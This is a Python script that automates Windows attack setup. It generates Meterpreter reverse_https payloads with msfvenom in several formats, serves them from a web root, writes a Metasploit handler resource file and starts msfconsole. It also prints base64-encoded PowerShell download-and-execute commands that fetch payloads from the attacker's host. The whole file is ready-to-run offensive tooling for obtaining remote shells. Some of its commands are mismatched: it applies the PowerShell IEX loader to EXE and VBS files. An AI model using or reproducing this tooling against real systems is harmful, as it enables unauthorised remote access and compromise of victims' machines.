#!/usr/bin/env python3
import os
import sys
import base64
import subprocess
import shutil
import socket
import fcntl
import struct

# Function to get the IP address of the provided network interface
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))  # Encode the interface name and get the IP address
    )[20:24])

def main(lhost, lport):
    tun0_ip = get_ip_address('tun0')  # Get the IP address of the 'tun0' interface

    # Commands to generate meterpreter reverse_https payloads for different file types using msfvenom
    msfvenom_commands = [
        "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} EXITFUNC=thread -f csharp -o x64methttps.cs".format(lhost, lport),
        "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} EXITFUNC=thread -f exe -o x64methttps.exe".format(lhost, lport),
        "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} EXITFUNC=thread -f vbapplication -o x64methttps.vbs".format(lhost, lport),
        "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} EXITFUNC=thread -f psh -o x64methttps.ps1".format(lhost, lport)
    ]

    # Execute each msfvenom command
    for command in msfvenom_commands:
        os.system(command)

    # List of payload files
    files = ['x64methttps.cs', 'x64methttps.exe', 'x64methttps.vbs', 'x64methttps.ps1']

    # Copy each payload file to the /var/www/html/ directory (assumed to be the web server's root directory)
    for file in files:
        shutil.copy(file, "/var/www/html/")

    # Content for the Metasploit resource file
    rc_content = """use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST {}
set LPORT {}
set exitfunc thread
run -j""".format(lhost, lport)

    # Write the Metasploit resource file
    with open('x64-met-https.rc', 'w') as f:
        f.write(rc_content)

    # Commands to download and execute each payload file, and their descriptions
    commands = [
        ("IEX(New-Object Net.WebClient).downloadString('http://{}/x64methttps.ps1')".format(lhost, lport), "PS1:"),
        ("IEX(New-Object Net.WebClient).downloadString('http://{}/x64methttps.exe')".format(lhost, lport), "EXE:"),
        ("IEX(New-Object Net.WebClient).downloadString('http://{}/x64methttps.vbs')".format(lhost, lport), "VBS:"),
        ("IEX(New-Object Net.WebClient).downloadString('http://{}/x64methttps.cs')".format(lhost, lport), "CS:")
    ]

    # For each command, encode it in base64, print the encoded command along with its description
    for command, description in commands:
        encoded_command = subprocess.check_output('echo -n "{}" | iconv -t UTF-16LE | base64 -w 0'.format(command), shell=True).decode().strip()
        print("{} powershell -nop -enc {}".format(description, encoded_command))

    # Start msfconsole with the Metasploit resource file
    os.system('msfconsole -q -r x64-met-https.rc')

# Entry point of the script
if __name__ == '__main__':
    # If the number of command-line arguments is not 3 (script name, LHOST, LPORT), print the usage and exit
    if len(sys.argv) != 3:
        print("Usage: {} LHOST LPORT".format(sys.argv[0]))
        sys.exit(1)

    # Call the main function with the LHOST and LPORT arguments
    main(sys.argv[1], sys.argv[2])

